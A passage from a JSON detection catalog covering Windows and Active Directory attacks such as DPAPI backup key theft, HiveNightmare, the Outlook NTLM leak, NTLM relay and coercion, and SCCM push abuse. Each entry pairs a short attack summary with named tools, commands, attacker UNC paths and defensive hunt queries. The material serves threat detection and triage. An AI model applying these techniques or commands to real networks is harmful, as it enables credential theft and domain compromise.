InitiatingProcessFileName"},{"plat":"Sentinel","t":"Object access (4663) to NTDS.dit/SAM hives from a non-backup process = theft black / scheduled backup product = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4663\n| where ObjectName has_any (\"ntds.dit\", \"\\\\config\\\\SAM\", \"\\\\config\\\\SYSTEM\", \"\\\\config\\\\SECURITY\")\n| where ProcessName !has_any (\"veeam\", \"backup\", \"vssvc\", \"tiworker\")\n| summarize accesses=count(), objs=make_set(ObjectName) by SubjectUserName, Computer, ProcessName, bin(TimeGenerated, 1h)\n| where accesses > 0"}],"huntcs":[{"plat":"Event Search","t":"SeBackup/SeRestore abuse; diskshadow, esentutl, robocopy /b, or reg save of SAM/NTDS = black.","q":"event_simpleName=ProcessRollup2 (FileName=\"diskshadow.exe\" OR FileName=\"esentutl.exe\" OR (FileName=\"robocopy.exe\" AND CommandLine=\"* /b*\") OR CommandLine=\"*ntds.dit*\" OR CommandLine=\"*create full*\" OR CommandLine=\"*reg* save* hklm\\\\sam*\" OR CommandLine=\"*reg* save* hklm\\\\system*\")\n| stats count values(CommandLine) as cmd by ComputerName, UserName, FileName, ParentBaseFileName\n| sort - count"}]},{"name":"DPAPI Domain Backup Key Theft","aka":"SharpDPAPI /rpc, lsadump::backupkeys, DPAPI PVK theft","phase":"credaccess","group":"Host / Local","mitre":"T1003, T1555","cve":"","sev":"Critical","summary":"Steals the DPAPI domain backup key (RSA PVK) held by the DC, giving unrestricted offline decryption of every domain user's master keys, credentials, and secrets — a whole different order of capability.","how":"With Domain Admin rights, obtain the domain backup key (.pvk) against a DC via mimikatz lsadump::backupkeys or SharpDPAPI backupkey /rpc (MS-BKRP protocol). Thereafter any user's DPAPI master key can be decrypted offline, giving a persistent capability to decrypt Credential Manager, browser-saved passwords, and certificate private keys across the domain.","tools":"mimikatz (lsadump::backupkeys), SharpDPAPI (backupkey/masterkeys), impacket dpapi.py backupkeys","detect":"Detect MS-BKRP (BackupKey Remote Protocol) calls to a DC from non-Tier0 processes. Monitor for anomalous RPC access to lsass/DC and SharpDPAPI's RPC retrieval pattern via EDR. Since the backup key cannot be re-obtained once leaked, treat the retrieval event itself as top priority.","events":"4662 (BootKey/BackupKeyオブジェクトアクセス), lsass関連の異常アクセス, MS-BKRP RPCログ","mitigate":"Strictly isolate admin access to DCs to Tier0; if leakage is already suspected, consider rolling over the domain backup key (effectively difficult and requiring planned handling). Protect lsass/DC RPC via EDR and minimize the number of Domain Admins.","triage":"Capture MS-BKRP (BackupKey Remote Protocol) RPC calls to the DC via EDR network/RPC telemetry and check whether the calling process matches mimikatz/SharpDPAPI/impacket dpapi.py from a non-Tier0 host. It is malicious when 4662 anomalous access to the BackupKey/BootKey object and abnormal RPC to lsass/the DC align on the same time and principal (treat the retrieval event itself as critical since the key cannot be re-derived). It is benign for DR/migration or legitimate DPAPI backup-key preservation when the actor is a Tier0 PAW with a known DA and a change ticket.","hunt":[{"plat":"Sentinel","t":"4662 read access to the DPAPI domain backup key (BCKUPKEY secret). Access from a non-Tier0/user account = black / DC self or known backup ops = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4662\n| where ObjectName has \"BCKUPKEY\" or Properties has \"BCKUPKEY\"   // DPAPI domain backup key LSA secret // confirm object GUID in your tenant\n| where AccessMask has_any (\"0x2\",\"0x10\",\"0x20\")               // ReadProperty / ControlAccess\n| where SubjectUserName !endswith \"$\" or SubjectUserName has_any (\"admin\",\"svc\")\n| summarize hits=count(), keys=make_set(ObjectName,10) by Computer, SubjectUserName, SubjectDomainName, bin(TimeGenerated, 5m)\n| where hits > 0"},{"plat":"MDE","t":"SharpDPAPI /rpc or lsadump::backupkeys command-line to pull the domain backup key. /rpc + backupkeys combo = black / legit backup tooling = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessCommandLine has_any (\"backupkeys\",\"lsadump::backupkeys\",\"SharpDPAPI\")\n| where ProcessCommandLine has_any (\"/rpc\",\"backupkey\",\"/domain\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine"}],"huntcs":[{"plat":"LogScale","t":"Non-Tier0 process running backupkeys/SharpDPAPI=black / legit DPAPI domain backup-key pull almost never happens=white","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(lsadump::backupkeys|SharpDPAPI.*(backup|\\/rpc)|backupkeys.*\\/nowrap)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count(as=hits))\n| sort(hits, order=desc)"},{"plat":"Event Search","t":"Unmanaged proc connecting protected_storage pipe = MS-BKRP backup-key request=black / lsass itself=white","q":"event_simpleName=NamedPipeConnected PipeName=\"*protected_storage*\"\n| where ContextBaseFileName!=\"lsass.exe\"\n| stats count by ComputerName, ContextBaseFileName, PipeName"}]},{"name":"HiveNightmare / SeriousSAM","aka":"SeriousSAM, HiveNightmare","phase":"credaccess","group":"Host / Local","mitre":"T1003.002","cve":"CVE-2021-36934","sev":"High","summary":"A CVE where a misconfiguration on Windows 10/11 gives BUILTIN\\Users read ACLs on the SAM/SYSTEM/SECURITY hives, letting a non-admin steal local credentials via shadow copies.","how":"On a vulnerable host, read an existing VSS shadow copy (\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\System32\\config\\SAM) with non-admin rights. Extract local account NT hashes, LSA secrets (including the machine's DPAPI_SYSTEM key), and cached domain credentials from the hives for Pass-the-Hash or local privilege escalation (the user's own DPAPI master key resides in the profile and must be obtained separately). Works as a standard user if a System Restore point exists.","tools":"HiveNightmare(seri#$hive), mimikatz, impacket-secretsdump, PowerShell VSSアクセス","detect":"Detect non-admin process reads of SAM/SYSTEM/SECURITY under System32\\config and access to GLOBALROOT/ShadowCopy paths via Sysmon/EDR. Treat hive-file opens by standard-user processes as anomalous.","events":"4663 (SAM/SYSTEM/SECURITYへのアクセス), Sysmon 11/1 (ShadowCopyパスアクセス)","mitigate":"Apply the MS fix patch and remove excessive ACLs with icacls %windir%\\system32\\config\\*.* /inheritance. Delete existing VSS shadow copies (vssadmin delete shadows) to remove residual exposure.","triage":"On the target host, use Sysmon EID11/1 and EDR to detect a standard (non-admin) process opening \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\System32\\config\\SAM/SYSTEM/SECURITY, and confirm non-admin access to these hives via 4663. It is malicious when, with a VSS shadow copy present, an ordinary-user process opens the hives and this chains into Pass-the-Hash or local escalation using extracted NT hashes. It is benign for legitimate VSS access by backup/forensics/AV or admin maintenance when the actor is a privileged process from a known product matching maintenance records.","hunt":[{"plat":"MDE","t":"Non-admin process touching SAM/SYSTEM/SECURITY hives via GLOBALROOT/ShadowCopy. Medium/Low integrity reading config hives = black / admin backup = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessCommandLine has_any (\"HarddiskVolumeShadowCopy\",\"GLOBALROOT\")\n| where ProcessCommandLine has_any (\"SAM\",\"SYSTEM\",\"SECURITY\",@\"\\config\")\n| where ProcessIntegrityLevel in (\"Medium\",\"Low\")\n| project Timestamp, DeviceName, AccountName, ProcessIntegrityLevel, FileName, ProcessCommandLine, InitiatingProcessFileName"},{"plat":"Sentinel","t":"4663 read on System32\\config SAM/SYSTEM/SECURITY hives by a standard user. Non-privileged hive open = black / SYSTEM or admin = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4663\n| where ObjectName has_any (@\"\\config\\SAM\", @\"\\config\\SYSTEM\", @\"\\config\\SECURITY\")\n| where AccessMask has_any (\"0x1\",\"0x20\",\"0x80\",\"0x120089\")   // read/read-attributes\n| where SubjectUserName !endswith \"$\" and SubjectUserName !in~ (\"SYSTEM\",\"LOCAL SERVICE\")\n| summarize count(), make_set(ObjectName,5) by Computer, SubjectUserName, ProcessName, bin(TimeGenerated, 10m)"}],"huntcs":[{"plat":"LogScale","t":"Reading config\\SAM/SYSTEM/SECURITY via a ShadowCopy path=SeriousSAM=black / backup software VSS=white","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/GLOBALROOT.*(HarddiskVolume)?ShadowCopy\\d+.*\\\\config\\\\(SAM|SYSTEM|SECURITY)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName, CommandLine], function=count(as=hits))\n| sort(hits, order=desc)"}]},{"name":"Outlook NTLM Leak (Coercion)","aka":"PidLidReminderFileParameter leak, Outlook zero-click NTLM","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1187","cve":"CVE-2023-23397","sev":"Critical","summary":"Email-based forced authentication that abuses the UNC reminder sound path (PidLidReminderFileParameter) of an Outlook calendar reminder to coerce the victim's Net-NTLM hash to an attacker server with no user interaction.","how":"Send a crafted appointment/task email with a UNC path (\\\\attacker\\share\\x.wav) set as PidLidReminderFileParameter and PidLidReminderOverride set to True. When Outlook processes the reminder, the victim authenticates over SMB to the UNC without even opening the mail, leaking Net-NTLMv2 to the attacker. The captured hash is used for relay (ESC8/LDAP) or offline cracking.","tools":"OutlookSpy/カスタムMAPIスクリプト, responder/impacket-ntlmrelayx, CVE-2023-23397.ps1(検査/PoC)","detect":"Use Microsoft's script (CVE-2023-23397.ps1) to scan mailboxes for items carrying a malicious PidLidReminderFileParameter. Detect outbound authentication from clients to unauthorized external/internal SMB (445) and connections to Responder.","events":"5145/4624 Type3 (SMB認証), ファイアウォールのアウトバウンド445, Exchangeメッセージトレース","mitigate":"Apply Outlook/Exchange security updates and block outbound external 445 at the perimeter. Add high-privilege users to Protected Users to disable NTLM, and apply Block NTLM policy.","triage":"In Exchange pull message-trace and run CVE-2023-23397.ps1 over the mailbox to find items whose PidLidReminderFileParameter points to a UNC (\\\\attacker\\share) with PidLidReminderOverride=True. It is malicious if, at reminder-processing time, the victim client shows outbound 445 (FW) plus 4624 Type3/SMB to a Responder/attacker IP and the target logs 5145 for the same user in sequence. It is benign if the UNC is an approved internal file server/DFS with a legitimate reminder sound, or backup/monitoring traffic; outbound 445 to an external or unapproved segment is the decider.","hunt":[{"plat":"MDE","t":"outlook.exe making outbound SMB(445) to an external IP (CVE-2023-23397). Outlook reaching external 445 = black / internal file server = white","q":"DeviceNetworkEvents\n| where Timestamp > ago(1d)\n| where RemotePort == 445\n| where InitiatingProcessFileName =~ \"outlook.exe\"\n| where not(ipv4_is_private(RemoteIP))\n| summarize attempts=count(), dests=make_set(RemoteIP,20) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 15m)\n| where attempts > 0"}],"huntcs":[{"plat":"Event Search","t":"outlook.exe making outbound 445 SMB auth=CVE-2023-23397 reminder coercion=black / Outlook never speaks 445 normally=white","q":"event_simpleName=NetworkConnectIP4 ContextBaseFileName=\"outlook.exe\" RemotePort=445\n| stats count by ComputerName, ContextBaseFileName, RemoteAddressIP4, RemotePort\n| sort - count"}]},{"name":"NTLM Reflection / Reflective SMB Relay","aka":"self-host authentication reflection, Reflective Kerberos/SMB relay","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557.001","cve":"CVE-2025-33073","sev":"High","summary":"A new class of relay vulnerability that reflects coerced authentication back to the originating host itself, exploiting missing SMB signing to escalate to SYSTEM.","how":"Use a specific marshaled name/alias (crafted SPN/name) to coerce a DC or host via PetitPotam etc., then reflect-relay that authentication back to the origin to establish an SMB session as local SYSTEM. It works where SMB signing is not enforced, using a reflection path distinct from LocalPotato/Drop-the-MIC.","tools":"impacket-ntlmrelayx(reflection対応), PetitPotam/Coercer, krbrelayx","detect":"Detect externally triggered self-directed SMB authentication within the same host (loopback-like 4624 Type3 immediately preceded by coercion RPC). Correlate coercion RPC (EFSRPC/MS-RPRN etc.) with an immediately following SYSTEM session establishment.","events":"4624 Type3 (自ホスト宛), 5145, EFSRPC/PrinterBug RPC呼び出しログ","mitigate":"Apply the June 2025 or later security updates. Require SMB signing on all hosts and enable Extended Protection for Authentication (EPA) and SMB server signing enforcement. Block coercion paths (EFSRPC/PrinterBug).","triage":"On the target host (DC/member server) correlate a coercion RPC call (MS-EFSR/EFSRPC or MS-RPRN PrinterBug) immediately followed by a self-directed 4624 Type3 + 5145 on the same host at nearly the same time. If reflection yields a local SYSTEM session and SMB signing is not enforced, it is malicious. It is benign if loopback SMB comes from legitimate backup/cluster/monitoring agents or a known vuln scanner with no preceding coercion RPC. The decider is the three-stage chain: coercion RPC to reflected logon to SYSTEM session.","hunt":[{"plat":"Sentinel","t":"Self-directed NTLM logon triggered by coercion (4624 Type3 where source = same host, CVE-2025-33073). WorkstationName == host = black / normal remote logon = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4624 and LogonType == 3\n| where TargetUserName endswith \"$\"\n| extend host = toupper(tostring(split(Computer, \".\")[0]))\n| where isnotempty(WorkstationName) and toupper(WorkstationName) == host   // logon reflected back to the same machine\n| summarize count(), make_set(IpAddress,10) by Computer, TargetUserName, bin(TimeGenerated, 5m)"},{"plat":"MDI","t":"MDI NTLM success where source device equals destination device (loopback relay). Self-targeted NTLM = black / normal host-to-host auth = white","q":"IdentityLogonEvents\n| where Timestamp > ago(1d)\n| where Protocol == \"Ntlm\" and ActionType == \"LogonSuccess\"\n| where isnotempty(DestinationDeviceName) and DeviceName == DestinationDeviceName\n| project Timestamp, AccountName, AccountDomain, DeviceName, DestinationDeviceName, IPAddress, LogonType"}],"huntcs":[{"plat":"Event Search","t":"Inbound 445 where Remote==Local IP=self-directed reflective SMB auth (CVE-2025-33073)=black / normal peer auth=white","q":"event_simpleName=NetworkReceiveAcceptIP4 RemotePort=445\n| where LocalAddressIP4=RemoteAddressIP4\n| stats count by ComputerName, ContextBaseFileName, LocalAddressIP4, RemoteAddressIP4\n| sort - count"},{"plat":"Event Search","t":"Type3 logon whose RemoteAddress is the host's own/loopback IP=reflection landing=black / normal remote Type3=white","q":"event_simpleName=UserLogon LogonType=3 RemoteAddressIP4=\"127.0.0.1\"\n| stats count by ComputerName, UserName, LogonType, RemoteAddressIP4"}]},{"name":"ADIDNS Spoofing","aka":"Invoke-DNSUpdate, wildcard/WPAD record injection, dnstool","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557","cve":"","sev":"High","summary":"Technique where an authenticated user adds arbitrary records (wildcard/WPAD) to an AD-integrated DNS zone via dynamic updates, hijacking name resolution to intercept and relay traffic.","how":"Abuse the default permission that lets Authenticated Users create records in AD-integrated DNS zones, injecting a wildcard (*) or WPAD record with Invoke-DNSUpdate or dnstool.py. Even when WPAD is protected by GlobalQueryBlockList, a wildcard hijacks name resolution comprehensively, enabling capture/relay even where LLMNR/mDNS is disabled.","tools":"Invoke-DNSUpdate (Powermad/DNS), krbrelayx dnstool.py, aiodnsbrute, Responder(捕捉側)","detect":"Detect dynamic registration of wildcard (*) or WPAD records and record additions by ordinary users via DNS server dnsServerLog/auditing. Periodically audit anomalous new records (short TTL, attacker IP) in the ADIDNS zone.","events":"DNS Server監査 515/516(レコード作成/削除), 513/514(ゾーン操作), 5136(dnsNodeオブジェクト変更), 4662","mitigate":"Keep wpad/isatap in GlobalQueryBlockList and consider enabling wildcard query blocking. Review ADIDNS zone ACLs to restrict dynamic updates to Secure-only and least privilege, and remove existing suspicious records.","triage":"On the DC pull DNS Server audit 515/516 (record create/delete) and 5136 (dnsNode object change) and check whether a wildcard (*) or WPAD record was dynamically registered by a normal user (Authenticated Users) with an attacker IP and short TTL. It is malicious if the creating SID is an ordinary user rather than an admin/DHCP/registration server and capture/relay activity follows. It is benign for DHCP dynamic updates, client self-registration, or legitimate records from known ops tooling. The decider is a * or wpad name created by a non-privileged user.","hunt":[{"plat":"Sentinel","t":"5136 dnsNode add of a wildcard(*)/WPAD record by a normal user (ADIDNS spoofing). * or wpad added by non-machine = black / DHCP/machine dynamic update = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"dnsNode\" or ObjectName has \"Dc=DnsZones\"    // ADIDNS node // confirm class in tenant\n| where ObjectName has_any (\"wpad\",\"DC=*\") or Properties has_any (\"wpad\",\"*.\")\n| where SubjectUserName !endswith \"$\"\n| project TimeGenerated, Computer, SubjectUserName, ObjectName, OperationType, Properties"}],"huntcs":[{"plat":"LogScale","t":"Invoke-DNSUpdate/dnstool/Powermad registering wildcard/WPAD records=ADIDNS spoofing=black / legit DNS console=white","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(Invoke-DNSUpdate|New-ADIDNSNode|Set-ADIDNSNode|dnstool(\\.py)?|Powermad)/i\n| groupBy([ComputerName, UserName, FileName, CommandLine], function=count(as=hits))\n| sort(hits, order=desc)"}]},{"name":"Share-placed NTLM Coercion","aka":"SCF/.library-ms/.url/LNK/desktop.ini poisoning, Farmer/Lnkbomb","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1187","cve":"","sev":"Medium","summary":"Classic coercion that places crafted files (SCF/.library-ms/.url/LNK/desktop.ini) on a writable share so that explorer forces Net-NTLM authentication to an attacker UNC when the folder is browsed.","how":"Place .SCF, .library-ms, .url, .lnk, or desktop.ini whose icon/sound/library reference points to an attacker UNC (\\\\attacker\\share) on a world-writable file share. When the victim opens the folder, explorer authenticates over SMB for preview/icon resolution, leaking Net-NTLMv2 to Responder for relay or cracking.","tools":"ntlm_theft, Farmer, Lnkbomb, responder/ntlmrelayx, Snaffler(書込共有発見)","detect":"Detect creation of .scf/.library-ms/.url/desktop.ini etc. on file shares (FileServer auditing/Sysmon 11). Monitor for numerous outbound SMB authentications from workstations to unknown UNCs and connections to Responder's responding IP.","events":"5145 (共有ファイルアクセス), 4663/Sysmon 11 (共有への細工ファイル作成), 4624 Type3","mitigate":"Minimize write ACLs on shares and reduce user-writable public folders. Restrict outbound external 445 at perimeter/internal and enforce SMB signing and EPA. Protect high-privilege users with Protected Users/Block NTLM.","triage":"On the file server (audit/Sysmon EID11) detect creation of .scf/.library-ms/.url/.lnk/desktop.ini on a world-writable share and inspect whether the embedded UNC points to an attacker/unknown host. It is malicious if, on a victim workstation that opened the folder, explorer.exe-driven 4624 Type3 to an unknown UNC chains with target-side 5145 at the same file-access time. It is benign for legitimate shortcuts/libraries/desktop.ini pointing to internal shares created by a distribution tool or the user. The decider is the destination IP and creator of the crafted file's UNC.","hunt":[{"plat":"MDE","t":"Creation of .scf/.library-ms/.url/LNK/desktop.ini on a file share (Farmer/Lnkbomb poisoning). Poison file dropped to share = black / normal document = white","q":"DeviceFileEvents\n| where Timestamp > ago(1d)\n| where ActionType == \"FileCreated\"\n| where isnotempty(ShareName)\n| where FileName endswith \".scf\" or FileName endswith \".library-ms\" or FileName endswith \".url\" or FileName endswith \".lnk\" or FileName =~ \"desktop.ini\"\n| project Timestamp, DeviceName, ShareName, FileName, FolderPath, RequestAccountName, InitiatingProcessFileName, InitiatingProcessAccountName"},{"plat":"MDE","t":"Workstation making many outbound SMB(445) auths to unknown UNC/attacker IPs. One host fanning out to many new 445 dests = black / known file servers only = white","q":"DeviceNetworkEvents\n| where Timestamp > ago(1d)\n| where RemotePort == 445\n| where InitiatingProcessFileName in~ (\"explorer.exe\",\"svchost.exe\",\"System\")\n| summarize dests=dcount(RemoteIP), ips=make_set(RemoteIP,25) by DeviceName, bin(Timestamp, 15m)\n| where dests > 8"}],"huntcs":[{"plat":"LogScale","t":"Farmer/Lnkbomb or .scf/.library-ms droppers=coercion files planted on a share=black / normal share ops=white","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(Farmer\\.exe|Invoke-Lnkbomb|Lnkbomb|\\.library-ms|\\.scf|desktop\\.ini.*IconResource)/i\n| groupBy([ComputerName, UserName, FileName, CommandLine], function=count(as=hits))\n| sort(hits, order=desc)"},{"plat":"Event Search","t":"Many hosts fan out to one IP on 445=Responder-style collector=black / traffic to a real file server=white (exclude server IPs)","q":"event_simpleName=NetworkConnectIP4 RemotePort=445\n| stats dc(ComputerName) as victims by RemoteAddressIP4\n| where victims > 10\n| sort - victims"}]},{"name":"NTLMv1 Downgrade & Crack","aka":"crack.sh, DES cracking, LmCompatibilityLevel downgrade","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557, T1110.002, T1550.002","cve":"","sev":"High","summary":"Technique that forces authentication down to NTLMv1; since the response is DES-based, a fixed challenge plus crack.sh fully recovers the NT hash.","how":"Use Responder etc. to fix the challenge to a static value (1122334455667788) and induce NTLMv1 authentication, collecting Net-NTLMv1 responses from coerced victim hosts (especially DC machine accounts). Because it is DES-based, a fixed challenge lets crack.sh deterministically recover the NT hash, feeding directly into Pass-the-Hash, Silver Ticket, or DCSync.","tools":"Responder (--lm / challenge固定), impacket, crack.sh, hashcat (-m 5500), PetitPotam(強制)","detect":"Detect the occurrence of NTLMv1 authentication itself via Netlogon/4624 package names or NTLM auditing. Inventory responses containing the fixed challenge (1122334455667788) and hosts with legacy LmCompatibilityLevel.","events":"8004/8003 (NTLM監査 Netlogon), 4624 (認証パッケージNTLMv1), Restrict NTLM監査ログ","mitigate":"Force LmCompatibilityLevel to 5 (NTLMv2 only, reject LM/NTLMv1). Use Restrict NTLM auditing to surface and retire residual NTLMv1, and advance Protected Users and NTLM disablement.","triage":"Pull NTLM auditing (8004/8003) and the 4624 authentication package to find NTLMv1 (or LM) negotiation, especially a DC machine-account Net-NTLMv1 response or auth carrying the fixed challenge 1122334455667788. It is malicious if v1 appears from a host that is not legacy LmCompatibilityLevel right after a coercion RPC. It is benign for truly legacy devices (old MFPs/embedded), an appliance's steady v1, or a known interop account. The decider is a fixed challenge combined with an account (DC$) that should never speak v1.","hunt":[{"plat":"Sentinel","t":"NTLMv1 authentication surfaced via Netlogon NTLM audit (8004). NTLM V1 negotiated = black / NTLMv2/Kerberos only = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 8004\n| where Properties has \"NTLM V1\" or Properties has \"NTLMv1\" or Properties has \"LM\"   // downgraded auth // confirm string in tenant\n| summarize count(), clients=make_set(WorkstationName,20) by Computer, TargetUserName, bin(TimeGenerated, 1h)\n| where count_ > 0"},{"plat":"Sentinel","t":"4624 Type3 NTLM logons aggregated per host to inventory legacy downgrade usage. NTLM clustered on few legacy hosts = black / tenant-wide NTLMv2 = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4624 and LogonType == 3\n| where Account !endswith \"$\"\n| summarize logons=count(), users=dcount(TargetUserName) by Computer, WorkstationName, IpAddress\n| where logons > 5\n| order by logons desc"}],"huntcs":[{"plat":"Event Search","t":"LmCompatibilityLevel lowered to 0-2=NTLMv1 downgrade setup=black / GPO holding it at 5=white","q":"event_simpleName=RegSystemConfigValueUpdate RegValueName=\"LmCompatibilityLevel\"\n| where RegStringValue IN (\"0\",\"1\",\"2\")\n| stats count by ComputerName, RegObjectName, RegValueName, RegStringValue"},{"plat":"Identity Protection","t":"NTLMv1 auth / fixed challenge is DC/Netlogon-only=surface via Falcon IDP detection=black","q":"// Falcon Identity Protection detection: NTLMv1 authentication / legacy NTLM downgrade (DC-only, no attacker-host endpoint footprint)"}]},{"name":"RemotePotato0 / Cross-session RPC Relay","aka":"RemotePotato0, cross-session NTLM relay","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1187, T1557","cve":"","sev":"High","summary":"Local privilege escalation that induces the NTLM authentication of an admin/DA interactively logged on to the same host via DCOM/RPC and cross-protocol relays it to LDAP etc. to seize domain privileges.","how":"With low privilege, abuse RPCSS/DCOM activation on a shared host to trigger the NTLM authentication of a high-privilege user (admin/DA) logged on to the same host. Forward that NTLM authentication to a remote attacker relay machine and cross-session relay it to LDAP/SMB to grant RBCD or self-assign DCSync rights. Especially effective against LDAP relay to DCs where LDAP signing/channel binding (EPA) is not enforced (SMB signing is an SMB-relay-side defense and is irrelevant to LDAP relay success).","tools":"RemotePotato0, impacket-ntlmrelayx (LDAPターゲット), socat(中継)","detect":"Detect signs of an interactively logged-on privileged user's credentials being NTLM-relayed to another host/DC (brief anomalous LDAP writes, RBCD attribute changes). Monitor for anomalous DCOM activation by low-privilege processes on shared terminals.","events":"5136 (msDS-AllowedToActOnBehalf変更), 4662 (WriteDACL/DCSync), 4624 Type3 (リレー先)","mitigate":"Enforce EPA and LDAP signing/channel binding to block cross-protocol relay. Keep privileged users from interactive logon on shared terminals (Tier separation), and apply Protected Users/NTLM disablement.","triage":"On a shared host (RDS/jump box) watch for anomalous DCOM/RPCSS activation from a low-priv process and correlate a signed-in privileged user's (DA) NTLM credential being relayed to a DC (relay-side 4624 Type3). It is malicious if the DC then shows short-window anomalous LDAP writes: 5136 (msDS-AllowedToActOnBehalf change) or 4662 (WriteDACL/DCSync grant) for that same privileged user, especially where EPA/LDAP signing is not enforced. It is benign for legitimate RBCD configuration, delegated admin from a PAW, or asset-management DCOM. The decider is a low-priv originating process on a cross-host relay path.","hunt":[{"plat":"Sentinel","t":"5136 write to RBCD attribute msDS-AllowedToActOnBehalfOfOtherIdentity (RemotePotato0 relay trace). Delegation attr added by non-admin = black / approved delegation change = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"msDS-AllowedToActOnBehalfOfOtherIdentity\"   // RBCD write\n| where OperationType has \"Add\" or OperationType == \"%%14674\"\n| project TimeGenerated, Computer, SubjectUserName, SubjectDomainName, ObjectName, OperationType, Properties"},{"plat":"Sentinel","t":"4662 WriteDACL/DCSync control access as a sign of an interactive privileged cred relayed to a DC. Replication rights from a user = black / DC-to-DC = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4662\n| where Properties has_any (\"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\",\"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\",\"WriteDacl\")   // DS-Replication-Get-Changes(-All)/WriteDACL\n| where SubjectUserName !endswith \"$\"\n| summarize count() by Computer, SubjectUserName, ObjectName, bin(TimeGenerated, 10m)"}],"huntcs":[{"plat":"LogScale","t":"RemotePotato0/RogueOxidResolver running=cross-session DCOM to NTLM relay=black / legit DCOM app=white","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(RemotePotato0|RogueOxidResolver|\\-m\\s?[0-2]\\s+\\-s\\s)/i\n| groupBy([ComputerName, UserName, FileName, CommandLine], function=count(as=hits))\n| sort(hits, order=desc)"},{"plat":"Identity Protection","t":"RBCD attribute write / WriteDACL at the relayed DC is DC-only LDAP=correlate via IDP=black","q":"// Falcon Identity Protection detection: NTLM relay + RBCD (msDS-AllowedToActOnBehalf) write on DC — pivot to attacker host proc above"}]},{"name":"SCCM Client Push / NAA Relay","aka":"SharpSCCM client push relay, NAA credential theft","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1187, T1557","cve":"","sev":"High","summary":"Attack surface that induces the site-server-driven authentication performed by SCCM client push installation to relay it to MSSQL/HTTP etc., and also recovers NAA credentials for domain lateral movement.","how":"Force client push with SharpSCCM to make the site server's management account (or machine account) authenticate to a controlled host, and relay that authentication with ntlmrelayx to MSSQL (site DB) or HTTP (management point) to gain site admin rights or DB access. Additionally decrypt NAA credentials from distribution policy to recover a legitimate domain account usable for lateral movement.","tools":"SharpSCCM (invoke client-push), impacket-ntlmrelayx (MSSQL/HTTP), sccmhunter, PXEThief","detect":"Detect unexpected outbound authentication from the site server/push install account to unexpected hosts, and anomalous relay connections to the MSSQL site DB. Monitor abuse of client push settings and anomalous logon sources for the NAA account.","events":"4624/4648 (プッシュアカウント認証), MSSQL監査ログ, MP IISログ, 4662","mitigate":"Disable client push installation and migrate to Enhanced HTTP/PKI + management point authentication. Retire NAA (or make it a least-privilege, logon-denied account), and enforce SMB signing/EPA on site server communications.","triage":"Pull the site server / client-push install account's 4624/4648, find outbound auth to an unexpected host (attacker-controlled) outside SCCM management, and correlate anomalous NTLM relay connections in MSSQL site-DB audit or MP IIS logs. It is malicious if the push account authenticates to an unenrolled host and is then relayed to the site DB/management point to gain sysadmin/DB rights. It is benign if it authenticates to known target collections on a legitimate deployment schedule and the NAA only logs on from expected servers. The decider is whether the auth target is inside or outside the legitimate client boundary.","hunt":[{"plat":"MDE","t":"Client push / NAA account performing network logons across many unexpected hosts. One account fanning out = black / distribution to expected hosts = white","q":"DeviceLogonEvents\n| where Timestamp > ago(1d)\n| where LogonType in (\"Network\",\"Batch\")\n| where AccountName has_any (\"clientpush\",\"sccmpush\",\"svc_sccm\",\"_naa\",\"naa\")   // adjust to your push/NAA naming\n| summarize hosts=dcount(DeviceName), devs=make_set(DeviceName,25) by AccountName, bin(Timestamp, 1h)\n| where hosts > 10"},{"plat":"MDE","t":"Anomalous outbound to MSSQL site DB (1433) from a site-server/push account (NAA relay). Push cred hitting DB directly = black / normal MP<->SQL = white","q":"DeviceNetworkEvents\n| where Timestamp > ago(1d)\n| where RemotePort == 1433\n| where InitiatingProcessAccountName has_any (\"clientpush\",\"sccmpush\",\"svc_sccm\",\"naa\")\n| summarize count(), targets=make_set(RemoteIP,15) by DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, bin(Timestamp, 30m)"}],"huntcs":[{"plat":"LogScale","t":"SharpSCCM invoking client-push or pulling NAA/secrets=SCCM push-cred theft=black / legit ConfigMgr ops=white","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(SharpSCCM|invoke\\s+client-push|get\\s+naa|get\\s+secrets|local\\s+secretmethods)/i\n| groupBy([ComputerName, UserName, FileName, CommandLine], function=count(as=hits))\n| sort(hits, order=desc)"},{"plat":"Event Search","t":"One host fanning out to multiple MSSQL site DBs (1433)=NAA relay landing=black / normal MP/SQL traffic=white","q":"event_simpleName=NetworkConnectIP4 RemotePort=1433\n| stats dc(RemoteAddressIP4) as sqldst by ComputerName, ContextBaseFileName\n| where sqldst > 3\n| sort - 